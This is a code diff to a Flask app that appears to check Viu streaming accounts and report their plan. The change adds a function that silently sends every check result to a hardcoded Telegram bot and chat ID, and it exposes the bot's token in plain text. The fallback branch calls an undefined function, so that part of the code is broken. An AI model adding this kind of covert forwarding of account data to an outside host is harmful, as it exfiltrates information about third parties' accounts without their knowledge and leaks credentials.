@@ -11,6 +11,16 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 CORS(app)
+def send_telegram_message(message):
+    try:
+        bot_token = '7519569930:AAEeznsHyGZ6MbkQpIBTue3djsqdRmnD8mU'
+        username = '1465561246'
+    
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={username}&text={message}"
+
+        requests.get(url)
+    except Exception as e:
+        send_message(message)
 
 def generate_guid():
     return str(uuid.uuid4())
@@ -131,7 +141,9 @@ def viucheck():
     else:
         result.append(f"Plan: BEYSIK_PLAN")
         result.append("Config: By VONEZ ❌")
-    return " | ".join(result)
+    message = " | ".join(result)
+    send_telegram_message(message)
+    return message
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0',port=5000)
